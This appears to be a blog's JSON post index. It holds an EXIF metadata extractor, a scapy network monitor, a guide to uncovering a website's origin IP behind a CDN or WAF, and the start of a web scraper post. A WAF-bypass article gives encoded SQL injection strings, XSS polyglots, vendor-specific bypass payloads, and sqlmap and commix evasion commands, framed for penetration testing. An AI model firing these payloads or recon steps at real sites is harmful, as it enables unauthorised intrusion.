GPSLatitudeRef'].values[0] != 'N':                lat = -lat            if exif_data['GPS GPSLongitudeRef'].values[0] != 'E':                lon = -lon            return lat, lon        return None    def convert_to_degrees(self, value):        d = float(value[0].num) / float(value[0].den)        m = float(value[1].num) / float(value[1].den)        s = float(value[2].num) / float(value[2].den)        return d + (m / 60.0) + (s / 3600.0)    def display_metadata(self):        self.metadata_display.config(state=\"normal\")        self.metadata_display.delete(1.0, tk.END)        for key, value in self.metadata.items():            if key == 'GPS Coordinates' and value:                lat, lon = value                self.metadata_display.insert(tk.END, f\"{key}: https://www.google.com/maps?q={lat},{lon}\\n\")            else:                self.metadata_display.insert(tk.END, f\"{key}: {value}\\n\")        self.metadata_display.config(state=\"disabled\")    def remove_metadata(self):        if not self.image_path:            messagebox.showwarning(\"Warning\", \"Please upload an image first.\")            return        try:            self.progress.start()            with Image.open(self.image_path) as img:                data = list(img.getdata())                image_without_exif = Image.new(img.mode, img.size)                image_without_exif.putdata(data)                new_image_path = os.path.splitext(self.image_path)[0] + \"_no_metadata\" + os.path.splitext(self.image_path)[1]                image_without_exif.save(new_image_path)            messagebox.showinfo(\"Success\", f\"Metadata removed successfully. New image saved as {new_image_path}\")            self.progress.stop()        except Exception as e:            messagebox.showerror(\"Error\", f\"Failed to remove metadata: {str(e)}\")            self.progress.stop()    def save_metadata(self):        if not self.metadata:            messagebox.showwarning(\"Warning\", \"No metadata available to save.\")            return        file_types = [(\"Text File\", \"*.txt\"), (\"JSON File\", \"*.json\")]        file_path = filedialog.asksaveasfilename(title=\"Save Metadata\", filetypes=file_types, defaultextension=\".txt\")        if file_path:            try:                if file_path.endswith(\".json\"):                    with open(file_path, 'w') as file:                        json.dump(self.metadata, file, indent=4)                else:                    with open(file_path, 'w') as file:                        for key, value in self.metadata.items():                            if key == 'GPS Coordinates' and value:                                lat, lon = value                                file.write(f\"{key}: https://www.google.com/maps?q={lat},{lon}\\n\")                            else:                                file.write(f\"{key}: {value}\\n\")                messagebox.showinfo(\"Success\", f\"Metadata saved as {file_path}\")            except Exception as e:                messagebox.showerror(\"Error\", f\"Failed to save metadata: {str(e)}\")if __name__ == \"__main__\":    root = tk.Tk()    app = MetaDataFinderGUI(root)    root.mainloop()Code StructureThe project is structured as follows:  Class Definition: The entire application is encapsulated within the MetaDataFinderGUI class.  UI Components:          Title Label      Description Label      File Upload Button      Image Preview Frame      Metadata Display Area      Action Buttons (Check Metadata, Remove Metadata, Save Metadata)      Progress Bar        Functional Methods:          upload_image: Handles image selection.      display_image: Displays the selected image in the UI.      check_metadata: Extracts and displays metadata.      remove_metadata: Removes metadata and saves the image.      save_metadata: Saves metadata to a file.        Helper Functions:          format_metadata: Formats metadata for display.      calculate_checksum: Computes the MD5 checksum of the image.      get_gps_coordinates: Extracts GPS coordinates from EXIF data.      convert_to_degrees: Converts GPS values to decimal degrees.      OutputMetadata DisplayWhen you click “Check Metadata,” the following information is displayed:  Date and Time  Camera Model  Device Name  Software  GPS Coordinates (with a clickable Google Maps link)  Checksum  File Name  File Size  File Type  Image Dimensions  Bit Depth  Color Type  Compression  InterlaceExample Saved Metadata FileJSON Format{    \"Date and Time\": \"2023:01:01 12:00:00\",    \"Camera Model\": \"Canon EOS R5\",    \"GPS Coordinates\": [40.7128, -74.0060],    \"Checksum\": \"d41d8cd98f00b204e9800998ecf8427e\",    \"File Name\": \"example.jpg\",    \"File Size\": 123456,    \"File Type\": \"JPEG\"}Text FormatDate and Time: 2023:01:01 12:00:00Camera Model: Canon EOS R5GPS Coordinates: https://www.google.com/maps?q=40.7128,-74.0060Checksum: d41d8cd98f00b204e9800998ecf8427eFile Name: example.jpgFile Size: 123456 bytesFile Type: JPEGLimitations  Supported File Formats: Currently supports only common image formats (JPG, JPEG, PNG, GIF, BMP).  EXIF Data Dependency: Metadata extraction relies on the presence of EXIF data in the image.  No Batch Processing: Limited to processing one image at a time.  Error Handling: Basic error handling; may not cover all edge cases.Future Enhancements  Batch Processing: Add support for processing multiple images simultaneously.  Advanced Metadata Editing: Allow users to edit specific metadata fields.  Cloud Integration: Enable metadata extraction and storage in cloud services.  Cross-Platform Support: Develop a web-based version of the tool.  Improved Error Handling: Enhance robustness by handling more edge cases.Ethical Considerations  Privacy: Metadata often contains sensitive information such as location data. Ensure that users are aware of the implications of extracting and sharing metadata.  Responsible Usage: Encourage users to use this tool responsibly and avoid misuse.  Legal Compliance: Comply with local laws and regulations regarding metadata usage and privacy."
  },
  
  {
    "title": "Network Monitor Tool",
    "url": "/posts/python-network-monitor-tool",
    "categories": "Python, Network Monitor",
    "tags": "Python, Network Monitor",
    "date": "2025-01-19 00:00:00 +0000",
    





    
    "snippet": "The Network Monitor is a tool designed to capture, analyze, and display real-time network traffic. It provides insights into network packets, including source and destination IP addresses, protocol...",
    "content": "The Network Monitor is a tool designed to capture, analyze, and display real-time network traffic. It provides insights into network packets, including source and destination IP addresses, protocols, ports, process names, packet sizes, and geographical locations of remote IPs. Additionally, it includes a real-time bandwidth usage graph to visualize inbound and outbound traffic.Key Features  Packet Capture: Monitors and captures all incoming and outgoing network packets in real-time.  Detailed Packet Analysis: Displays packet details such as:          Timestamp      Source and Destination IP Addresses      Protocol (TCP, UDP, ICMP, DNS, HTTP, FTP, SMTP, SNMP, IMAP)      Port Numbers      Associated Process Names      Packet Size (in bytes)      Geographical Location of Remote IPs        GeoIP Lookup: Uses an external API (e.g., ipstack) to determine the country, city, and ISP of remote IP addresses.  Real-Time Bandwidth Graph: Visualizes inbound and outbound traffic over time using a dynamic graph.  Filtering Capabilities: Allows users to filter packets based on:          IP Address      Port Number      Protocol Type        Auto Scroll Toggle: Enables or disables automatic scrolling in the packet list view.  User-Friendly Interface: Built using Tkinter, providing an intuitive GUI for easy interaction.How It Works  Initialization: The application starts by retrieving the local machine’s IP address and initializing the GUI.  Packet Sniffing: Using the scapy library, the application captures network packets in real-time.  Packet Processing: Each captured packet is analyzed to extract relevant information such as source/destination IPs, protocol, port, process name, and packet size.  GeoIP Lookup: For each remote IP address, a GeoIP lookup is performed to retrieve geographical details.  Display: The extracted information is displayed in a tabular format within the GUI, and the bandwidth graph is updated dynamically.  Filters: Users can apply filters to narrow down the displayed packets based on specific criteria.Full CodeGithub Repository:  Network Monitor Toolimport psutilfrom scapy.layers.inet import IP, TCP, UDP, ICMPfrom scapy.layers.dns import DNSfrom scapy.all import sniff, Rawfrom datetime import datetimeimport threadingimport timeimport platformimport socketimport tkinter as tkfrom tkinter import ttkimport matplotlib.pyplot as pltfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAggimport requests# ANSI Color CodesRESTART = '\\033[0m'B = '\\033[0;30m'R = '\\033[0;31m'G = '\\033[0;32m'Y = '\\033[0;33m'BLU = '\\033[0;34m'P = '\\033[0;35m'C = '\\033[0;36m'W = '\\033[0;37m'IP_ADDRESS = \"127.0.0.1\"def get_ip_address():    system = platform.system()    if system == \"Windows\":        hostname = socket.gethostname()        ip_address = socket.gethostbyname(hostname)    else:        try:            ip_address = socket.gethostbyname(socket.gethostname())            if ip_address.startswith(\"127.\"):                ip_address = socket.gethostbyname(socket.getfqdn())        except socket.gaierror:            ip_address = \"Unable to get IP address\"    return ip_addressdef get_process_name_by_port(port):    try:        for conn in psutil.net_connections(kind='inet'):            if conn.laddr.port == port or (conn.raddr and conn.raddr.port == port):                if conn.pid:                    try:                        return psutil.Process(conn.pid).name()                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):                        pass        return \"Unknown\"    except Exception as e:        print(f\"Error retrieving process name: {e}\")        return \"Unknown\"class GeoIPLookup:    def __init__(self, api_key=None):        self.api_key = api_key    def lookup(self, ip):        try:            response = requests.get(f\"http://api.ipstack.com/{ip}\", params={\"access_key\": self.api_key})            if response.status_code == 200:                data = response.json()                country = data.get(\"country_name\", \"Unknown\")                city = data.get(\"city\", \"Unknown\")                isp = data.get(\"connection\", {}).get(\"isp\", \"Unknown\")                return f\"{country}, {city} | ISP: {isp}\"            return \"Unknown Location\"        except Exception as e:            print(f\"Error during GeoIP lookup: {e}\")            return \"Error during lookup\"class NetworkMonitorApp:    def __init__(self, root, api_key=None):        self.root = root        self.root.title(\"Network Monitor\")        self.root.geometry(\"1200x800\")        # Treeview for packet details        self.tree = ttk.Treeview(            root,            columns=(\"Time\", \"Source\", \"Destination\", \"Protocol\", \"Port\", \"Process\", \"Size\", \"Location\"),            show=\"headings\",        )        self.tree.heading(\"Time\", text=\"Timestamp\")        self.tree.heading(\"Source\", text=\"Source IP\")        self.tree.heading(\"Destination\", text=\"Destination IP\")        self.tree.heading(\"Protocol\", text=\"Protocol\")        self.tree.heading(\"Port\", text=\"Port\")        self.tree.heading(\"Process\", text=\"Process\")        self.tree.heading(\"Size\", text=\"Size (Bytes)\")        self.tree.heading(\"Location\", text=\"Location\")        self.tree.pack(fill=tk.BOTH, expand=True)        # Scrollbar for Treeview        self.scrollbar = ttk.Scrollbar(root, orient=tk.VERTICAL, command=self.tree.yview)        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)        self.tree.configure(yscrollcommand=self.scrollbar.set)        # Buttons        self.start_button = tk.Button(root, text=\"Start Monitoring\", command=self.start_monitoring)        self.start_button.pack(pady=10)        self.stop_button = tk.Button(root, text=\"Stop Monitoring\", command=self.stop_monitoring, state=tk.DISABLED)        self.stop_button.pack(pady=10)        # Filter Frame        self.filter_frame = tk.Frame(root)        self.filter_frame.pack(pady=10)        tk.Label(self.filter_frame, text=\"Filter by IP:\").grid(row=0, column=0)        self.ip_filter = tk.Entry(self.filter_frame)        self.ip_filter.grid(row=0, column=1)        tk.Label(self.filter_frame, text=\"Filter by Port:\").grid(row=0, column=2)        self.port_filter = tk.Entry(self.filter_frame)        self.port_filter.grid(row=0, column=3)        tk.Label(self.filter_frame, text=\"Filter by Protocol:\").grid(row=0, column=4)        self.protocol_filter = ttk.Combobox(            self.filter_frame, values=[\"TCP\", \"UDP\", \"ICMP\", \"DNS\", \"HTTP\", \"FTP\", \"SMTP\", \"SNMP\", \"IMAP\"]        )        self.protocol_filter.grid(row=0, column=5)        self.apply_filter_button = tk.Button(self.filter_frame, text=\"Apply Filters\", command=self.apply_filters)        self.apply_filter_button.grid(row=0, column=6)        self.reset_filter_button = tk.Button(self.filter_frame, text=\"Reset Filters\", command=self.reset_filters)        self.reset_filter_button.grid(row=0, column=7)        # Auto Scroll Toggle        self.auto_scroll = True        self.toggle_scroll_button = tk.Button(root, text=\"Disable Auto Scroll\", command=self.toggle_auto_scroll)        self.toggle_scroll_button.pack(pady=10)        # Bandwidth Graph        self.figure = plt.Figure(figsize=(6, 4), dpi=100)        self.ax = self.figure.add_subplot(111)        self.canvas = FigureCanvasTkAgg(self.figure, master=root)        self.canvas.get_tk_widget().pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)        # GeoIP Lookup        self.geoip_lookup = GeoIPLookup(api_key=api_key)        self.running = False        self.total_bytes_in = 0        self.total_bytes_out = 0        self.timestamps = []        self.bandwidth_in = []        self.bandwidth_out = []    def packet_callback(self, packet):        if not self.running:            return        if packet.haslayer(IP):            ip_layer = packet[IP]            src_ip = ip_layer.src            dst_ip = ip_layer.dst            proto = ip_layer.proto            protocol = \"N/A\"            port = \"N/A\"            size = len(packet)            if proto == 6:                protocol = \"TCP\"                if packet.haslayer(TCP):                    port = packet[TCP].sport                    process_name = get_process_name_by_port(packet[TCP].sport)            elif proto == 17:                protocol = \"UDP\"                if packet.haslayer(UDP):                    port = packet[UDP].sport                    process_name = get_process_name_by_port(packet[UDP].sport)            elif proto == 1:                protocol = \"ICMP\"                process_name = \"System\"            elif packet.haslayer(DNS):                protocol = \"DNS\"                process_name = \"System\"            elif packet.haslayer(Raw) and b\"HTTP\" in bytes(packet[Raw]):                protocol = \"HTTP\"                process_name = \"System\"            elif packet.haslayer(TCP) and packet[TCP].dport == 21:                protocol = \"FTP\"                process_name = \"System\"            elif packet.haslayer(TCP) and packet[TCP].dport == 25:                protocol = \"SMTP\"                process_name = \"System\"            elif packet.haslayer(UDP) and packet[UDP].dport == 161:                protocol = \"SNMP\"                process_name = \"System\"            elif packet.haslayer(TCP) and packet[TCP].dport == 143:                protocol = \"IMAP\"                process_name = \"System\"            else:                process_name = \"Unknown\"            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')            location = self.geoip_lookup.lookup(dst_ip)            # Insert into treeview            item_id = self.tree.insert(                \"\", tk.END, values=(timestamp, src_ip, dst_ip, protocol, port, process_name, size, location)            )            if self.auto_scroll:                self.tree.see(item_id)            # Update bandwidth stats            if src_ip == IP_ADDRESS:                self.total_bytes_out += size            else:                self.total_bytes_in += size            self.update_bandwidth_graph()    def start_monitoring(self):        self.running = True        self.start_button.config(state=tk.DISABLED)        self.stop_button.config(state=tk.NORMAL)        self.sniff_thread = threading.Thread(target=self.start_sniffing)        self.sniff_thread.daemon = True        self.sniff_thread.start()    def stop_monitoring(self):        self.running = False        self.start_button.config(state=tk.NORMAL)        self.stop_button.config(state=tk.DISABLED)    def start_sniffing(self):        sniff(prn=self.packet_callback, filter=\"ip\", store=0)    def update_bandwidth_graph(self):        self.timestamps.append(time.time())        self.bandwidth_in.append(self.total_bytes_in / 1024)        self.bandwidth_out.append(self.total_bytes_out / 1024)        if len(self.timestamps) &gt; 10:            self.timestamps.pop(0)            self.bandwidth_in.pop(0)            self.bandwidth_out.pop(0)        self.ax.clear()        self.ax.plot(self.timestamps, self.bandwidth_in, label=\"Inbound (KB)\", color=\"blue\")        self.ax.plot(self.timestamps, self.bandwidth_out, label=\"Outbound (KB)\", color=\"red\")        self.ax.set_title(\"Real-Time Bandwidth Usage\")        self.ax.set_xlabel(\"Time\")        self.ax.set_ylabel(\"Data (KB)\")        self.ax.legend()        self.ax.grid(True)        self.canvas.draw()    def apply_filters(self):        ip_filter = self.ip_filter.get().strip().lower()        port_filter = self.port_filter.get().strip().lower()        protocol_filter = self.protocol_filter.get().strip().lower()        for child in self.tree.get_children():            values = self.tree.item(child, \"values\")            src_ip, dst_ip, protocol, port = (                values[1].lower(),                values[2].lower(),                values[3].lower(),                values[4].lower(),            )            if (                (not ip_filter or ip_filter in src_ip or ip_filter in dst_ip)                and (not port_filter or port_filter == port)                and (not protocol_filter or protocol_filter == protocol)            ):                self.tree.reattach(child, \"\", 0)            else:                self.tree.detach(child)    def reset_filters(self):        for child in self.tree.get_children():            self.tree.reattach(child, \"\", 0)    def toggle_auto_scroll(self):        self.auto_scroll = not self.auto_scroll        if self.auto_scroll:            self.toggle_scroll_button.config(text=\"Disable Auto Scroll\")        else:            self.toggle_scroll_button.config(text=\"Enable Auto Scroll\")if __name__ == \"__main__\":    IP_ADDRESS = get_ip_address()    GEOIP_API_KEY = \"\"  # Replace with your actual API key    root = tk.Tk()    app = NetworkMonitorApp(root, api_key=GEOIP_API_KEY)    root.mainloop()Future ImplementationsWhile the current version of the Network Monitor Application provides robust functionality, there are several potential enhancements and features that could be added in future iterations:  Advanced Filtering:          Allow filtering by MAC addresses.      Add support for filtering by packet payload content (e.g., keywords in HTTP requests).        Export Functionality:          Enable exporting packet logs to CSV, JSON, or other formats for further analysis.        Enhanced GeoIP Lookup:          Integrate more advanced GeoIP services for better accuracy and additional details (e.g., latitude/longitude).      Cache frequently accessed GeoIP lookups to reduce API calls and improve performance.        Dark Mode Support:          Add a dark mode theme for improved readability and aesthetics.        Alert System:          Implement alerts for suspicious activities, such as unexpected outbound connections or large data transfers.        Multi-Interface Support:          Allow monitoring of multiple network interfaces simultaneously.        Performance Optimization:          Optimize packet processing and UI updates for smoother performance on high-traffic networks.        Packet Reconstruction:          Add the ability to reconstruct and display full HTTP requests/responses or other protocol-specific data.        User Authentication:          Introduce user authentication and role-based access control for secure usage in enterprise environments.        Cross-Platform Packaging:          Package the application as a standalone executable for Windows, macOS, and Linux using tools like PyInstaller.      These enhancements would make the application even more versatile and valuable for both personal and professional use cases.Output"
  },
  
  {
    "title": "WAF Bypass: Techniques, Tools, and Tactics for Penetration Testers",
    "url": "/posts/waf-bypass",
    "categories": "Exploits, WAF Bypass",
    "tags": "Exploits, WAF Bypass, Web Application Security",
    "date": "2025-01-17 00:00:00 +0000",
    





    
    "snippet": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work...",
    "content": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work?  Famous WAF Services  The Importance of a WAF in Vulnerability Protection  Top 10 Ways to Bypass a WAF  Advanced WAF Bypass Techniques  Tools to Bypass WAFs  XSS Bypass Techniques and Payloads  Real-World Examples of WAF Bypasses  Best Practices for Defenders  ConclusionWhat is a Web Application Firewall (WAF)?A Web Application Firewall (WAF) is a security mechanism that monitors, filters, and blocks HTTP/HTTPS traffic to and from a web application. Its primary purpose is to protect web applications from common cyber threats like cross-site scripting (XSS), SQL injection (SQLi), file inclusion attacks, and other types of malicious payloads. WAFs analyze the data that flows between the internet and a web application, looking for patterns of attack and preventing potentially harmful traffic from reaching the application.Purpose of a WAFThe role of a WAF in a security strategy is critical because web applications are increasingly targeted by hackers. As more organizations move services online, they become prime targets for attackers looking to steal data, disrupt services, or gain unauthorized access to sensitive systems.A WAF provides several key functions:  Traffic Filtering: Inspects incoming HTTP requests and blocks malicious traffic based on predefined rules.  Attack Prevention: Actively mitigates the risk of common web vulnerabilities, including XSS, SQL injection, remote file inclusion (RFI), and others.  Access Control: Restricts access to certain parts of a web application, ensuring only authorized users can access sensitive data.  DDoS Mitigation: Some WAFs provide built-in protection against distributed denial of service (DDoS) attacks.How Does a WAF Work?WAFs typically operate at the application layer (Layer 7) of the OSI model, monitoring HTTP/HTTPS requests. They are placed in front of a web application to inspect traffic before it reaches the application server. WAFs rely on various detection mechanisms, including:  Signature-based Detection: Compares traffic against known attack patterns.  Behavioral Analysis: Identifies abnormal behavior that deviates from the norm.  Rule-based Detection: Administrators can define custom rules for specific attack patterns.Famous WAF ServicesSeveral companies offer Web Application Firewall services, some of the most notable include:  AWS Web Application Firewall (AWS WAF)  Cloudflare WAF  Imperva WAF  F5 Advanced WAF  Azure Web Application FirewallThe Importance of a WAF in Vulnerability ProtectionA properly configured WAF plays a vital role in securing applications. However, it’s important to understand that WAFs are not foolproof. Despite their ability to block many common attacks, they can often be bypassed by skilled attackers. For cybersecurity professionals, particularly penetration testers and red teams, understanding how WAFs function and the weaknesses in their detection systems is key to finding vulnerabilities.Top 10 Ways to Bypass a WAF  Payload Encoding and Obfuscation          Techniques: Hex encoding, Base64 encoding, URL encoding.      Example: %53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73%20%57%48%45%52%45%20%69%64%20%3D%201;        HTTP Parameter Pollution          Example: GET /login?username=admin&amp;password=admin123&amp;password=malicious_payload        Case Transformation          Example: SeLeCt * FrOm users WhErE username = 'admin';        IP Fragmentation          Example: Splitting payloads into multiple IP packets.        JSON and XML Payloads          Example: Injecting malicious code into JSON/XML formats.        Session Awareness Bypassing          Example: Spreading attacks across multiple requests.        404 Bypassing          Example: Targeting non-existent pages to reduce WAF scrutiny.        DNS-Based Attacks          Example: Sending requests directly to the server’s IP address.        Rate Limiting Bypass          Example: Distributing requests across a botnet.        Exploiting Zero-Day Vulnerabilities          Example: Using unpatched flaws in software.      Advanced WAF Bypass Techniques1. Polyglot Payloads  Polyglot payloads are designed to work in multiple contexts (e.g., HTML, JavaScript, SQL).  Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/2. Time-Based Attacks  Exploiting time delays in WAF processing to bypass detection.  Example: Using SLEEP() in SQL injection payloads.3. Content-Type Manipulation  Changing the Content-Type header to confuse the WAF.  Example: Sending a JSON payload with Content-Type: text/plain.4. Chunked Encoding  Splitting payloads into chunks to evade detection.  Example: Using Transfer-Encoding: chunked in HTTP requests.Tools to Bypass WAFsHere are some popular tools used to bypass WAFs:  SQLMap          Features: Payload encoding, tamper scripts.      Command: python sqlmap.py -u \"&lt;http://target.com/page.php?id=1&gt;\" --tamper=between,randomcase        WAFNinja          Features: Payload obfuscation, fragmentation.      Command: python wafninja.py -u \"&lt;http://target.com/page&gt;\" --method get --payloads sql_injection.txt        Nmap with NSE Scripts          Features: HTTP fragmentation, custom user-agent injection.      Command: nmap --script http-waf-detect target.com        Burp Suite with Extensions          Features: Payload encoding, fuzzing.      Example: Use the Bypass WAF extension.        Commix          Features: Command injection payloads.      Command: python commix.py --url=\"&lt;http://target.com/page.php?id=1&gt;\" --waf-bypass        OWASP ZAP          Features: Fuzzing, scripting.      Example: Use custom scripts to test WAF evasion.      XSS Bypass Techniques and PayloadsCommon Techniques  Obfuscation          Example: &lt;img src=x onerror=\"/*&lt;![CDATA[*/alert(1)/*]]&gt;*/\"&gt;        Alternate Event Handlers          Example: &lt;div style=\"width:expression(alert(1))\"&gt;&lt;/div&gt;        Polyglot Payloads          Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/        Payload Splitting          Example: &lt;img src='1' onerror='ja'+'vascript:alert(1)'&gt;        Manipulating Headers          Example: Injecting malicious content into HTTP headers.      WAF-Specific Payloads  Akamai: &lt;style&gt;@keyframes a{}b{animation:a;}&lt;/style&gt;&lt;b/onanimationstart=prompt ${document.domain}&amp;#x60;&gt;  Cloudflare: &lt;a\"/onclick=(confirm)()&gt;Click Here!  Imperva: &lt;x/onclick=globalThis&amp;lsqb;'\\u0070r\\u006f'+'mpt']&amp;lt;)&gt;clickme  Incapsula: &lt;iframe/onload='this[\"src\"]=\"javas&amp;Tab;cript:al\"+\"ert\"';&gt;  WordFence: &lt;meter onmouseover=\"alert(1)\"Real-World Examples of WAF Bypasses  Cloudflare WAF Bypass          Attackers used chunked encoding to bypass Cloudflare’s detection mechanisms.      Example: Splitting payloads into multiple chunks to evade signature-based detection.        AWS WAF Bypass          Exploiting misconfigurations in AWS WAF rules to inject malicious payloads.      Example: Using JSON payloads with malformed syntax to bypass detection.        Imperva WAF Bypass          Attackers used polyglot payloads to exploit Imperva’s rule-based detection.      Example: Combining HTML, JavaScript, and SQL in a single payload.      Best Practices for Defenders  Regular Updates: Keep WAF signatures and rules up-to-date.  Defense-in-Depth: Use multiple layers of security (e.g., input validation, CSP).  Security Testing: Perform regular penetration testing and security assessments.  Behavioral Analysis: Implement machine learning-based behavioral analysis to detect anomalies.  Logging and Monitoring: Continuously monitor WAF logs for suspicious activity.ConclusionWhile WAFs are powerful tools for defending web applications, they are not invulnerable. Attackers constantly develop new methods to bypass these defenses, and the techniques and tools discussed above are instrumental in identifying vulnerabilities that may be missed by a WAF. For security professionals, it’s essential to stay informed about the latest bypass techniques and ensure WAF configurations are up to date."
  },
  
  {
    "title": "Discover the Origin IP Address of a Website and Identify WAF Protection",
    "url": "/posts/find-origin-ip-website",
    "categories": "Guides, Discover Origin IP Address of a Website and Identify WAF",
    "tags": "Guides, Origin IP, Identify WAF",
    "date": "2025-01-15 00:00:00 +0000",
    





    
    "snippet": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an ...",
    "content": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an additional layer of protection that can complicate security assessments and bug bounty testing. However, uncovering the source IP address allows you to bypass these layers and directly assess the server, potentially revealing vulnerabilities hidden by the WAF or CDN.This guide will explore methods for identifying whether a website is behind a WAF/CDN and techniques for discovering its origin IP address.Step 1: Identifying if a Website is Behind a WAF/CDNBefore attempting to find the origin IP, it’s crucial to confirm whether the website is protected by a WAF or CDN. Here are some methods to achieve this:1.1 Ping TestPerform a simple ping test to gather initial information about the IP address associated with the domain:ping target.comIf the IP resolves to a known CDN/WAF provider (e.g., Cloudflare, Amazon CloudFront, Akamai), it indicates the presence of such protection.1.2 Browser ExtensionsUse browser extensions like Wappalyzer to detect CDNs and WAFs. Simply visit the target website and check for any indicators of protection mechanisms.1.3 WafWOOF ToolWafWOOF is a specialized tool designed to identify WAFs. Run the following command:wafw00f https://target.comThis will reveal whether a WAF is in place and specify which one.1.4 WHOIS LookupA WHOIS lookup can provide insights into the hosting provider. If the registrar or hosting details point to a CDN/WAF vendor, it confirms their usage.Step 2: Methods for Discovering the Origin IP AddressOnce you’ve determined that a WAF/CDN is present, proceed with the following techniques to uncover the origin IP address:2.1 DNSReconDNSRecon performs reverse DNS lookups and may expose the origin IP if the server lacks robust WAF protection:dnsrecon -d target.com2.2 Shodan DorksLeverage Shodan’s search capabilities to locate leaked IPs:ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200For automated results, combine Shodan CLI with HTTPX:shodan search ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200 --fields ip_str | httpx-toolkit -sc -title -server -td2.3 CensysCensys is another powerful tool for IP discovery. Search for the target domain and review IPv4 entries matching SSL certificates or host details:https://search.censys.io/hosts?q=&lt;DOMAIN&gt;2.4 SecurityTrailsSecurityTrails offers historical DNS records, which can be invaluable for identifying past IP associations:https://securitytrails.com/domain/&lt;DOMAIN&gt;/history/a2.5 FOFAFOFA excels at finding specific server configurations. Use the favicon hash for refined results:https://fofa.info/Steps:  Extract the favicon URL from the website.  Generate its hash using tools like favicon-hash.  Search for the hash in FOFA.2.6 ZoomEyeSimilar to Shodan, ZoomEye indexes internet devices. Perform a domain search and filter results by favicon hash:https://www.zoomeye.org/searchResult?q=&lt;DOMAIN&gt;2.7 ViewDNS.infoViewDNS provides historical DNS records, including previous IP addresses:https://viewdns.info/iphistory/?domain=&lt;DOMAIN&gt;2.8 SPF RecordsSPF records list authorized sending IPs for email. While not always indicative of the web server, they can sometimes reveal relevant IPs:https://mxtoolbox.com/SuperTool.aspx?action=spf:&lt;DOMAIN&gt;2.9 VirusTotalVirusTotal aggregates data from multiple sources, making it useful for discovering subdomains and associated IPs:https://www.virustotal.com/gui/domain/&lt;DOMAIN&gt;/details2.10 AlienVault OTXAlienVault Open Threat Exchange (OTX) offers threat intelligence data, including IP mappings:https://otx.alienvault.com/indicator/hostname/&lt;DOMAIN&gt;2.11 Custom Bash ScriptCombine VirusTotal and AlienVault outputs into a single script for streamlined results:#!/bin/bash# API keys (replace with your own keys)VT_API_KEY=\"&lt;api_key&gt;\"OTX_API_KEY=\"&lt;api_key&gt;\"# Function to fetch IP addresses from VirusTotalfetch_vt_ips() {    local domain=$1    curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?domain=$domain&amp;apikey=$VT_API_KEY\" \\        | jq -r '.. | .ip_address? // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Function to fetch IP addresses from AlienVaultfetch_otx_ips() {    local domain=$1    curl -s -H \"X-OTX-API-KEY: $OTX_API_KEY\" \"https://otx.alienvault.com/api/v1/indicators/hostname/$domain/url_list?limit=500&amp;page=1\" \\        | jq -r '.url_list[]?.result?.urlworker?.ip // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Check if domain is providedif [ -z \"$1\" ]; then    echo \"Usage: $0 &lt;domain_name_or_url&gt;\"    exit 1fiDOMAIN=$1OUTPUT_FILE=\"${DOMAIN}_ips.txt\"# Get IPs from both sources, remove duplicates, and save to fileecho \"Collecting IP addresses for: $DOMAIN\"{    fetch_vt_ips $DOMAIN    fetch_otx_ips $DOMAIN} | sort -u &gt; \"$OUTPUT_FILE\"echo \"IP addresses saved to: $OUTPUT_FILE\"Step 3: Verifying the Origin IPAfter identifying potential IPs, verify them through the following steps:3.1 /etc/hosts FileModify your /etc/hosts file to map the domain to the suspected IP:&lt;ORIGIN_IP&gt; target.comReload the browser and observe if the site loads correctly without WAF intervention.3.2 Nmap Certificate CheckUse Nmap to inspect the SSL certificate of the IP:nmap --script ssl-cert -p 443 &lt;ORIGIN_IP&gt;Ensure the certificate matches the target domain.3.3 Burp Suite TestingConfigure Burp Suite to route traffic through the discovered IP:  Set the upstream proxy to the origin IP.  Intercept requests and confirm responses originate from the backend server.Tips for Bug Bounty Hunters  Avoid Premature Reporting: Once you discover the origin IP, thoroughly explore it for vulnerabilities like SQL injection, XSS, or misconfigurations before submitting findings.  Test Without WAF: With direct access to the backend server, exploit testing becomes significantly easier due to the absence of WAF filtering.  Document Your Process: Maintain detailed records of your methodology and discoveries for transparency during reporting."
  },
  
  {
    "title": "Web Scraper and Crawling Tool",
    "url": "/posts/python-web-scraper",
    "categories": "Python, Web Scraper",
    "tags": "Python, Web Scraper",
    "date": "2025-01-12 00:00:00 +0000",
    





    
    "snippet": "A Python-based web scraping and crawling tool with a graphical user interface (GUI) built using tkinter. This tool allows users to crawl websites, download pages, and save them locally while mainta...",
    "content": "A Python-based web scraping and crawling tool with a graphical user interface (GUI) built using tkinter. This tool allows users to crawl websites, download pages, and save them locally while maintaining the directory structure. It’s designed for ease of use, with features like depth control, rate limiting, and real-time logging.Features  Intuitive GUI: Built with tkinter for a user-friendly experience.  Depth Control: Set the maximum depth for crawling to control how far the crawler goes.  Local Saving: Downloads and saves web pages locally, rewriting links for offline use.  Rate Limiting: Configurable delay between requests to avoid overwhelming servers.  Stop Functionality: Stop the crawling process at any time with a single click.  Real-Time Logging: Monitor the crawling process with live updates in the GUI.How It WorksCrawling AlgorithmThe crawler uses a breadth-first search (BFS) algorithm with depth control:  Starts with the base URL at depth 0.  Processes pages in FIFO order.  Discovers new links up to the specified maximum depth.  Maintains a set of visited URLs to avoid duplicates.URL ValidationThe tool includes special handling for Wikipedia and other sites:def is_valid_url(self, url):    # Skip images and non-HTML files    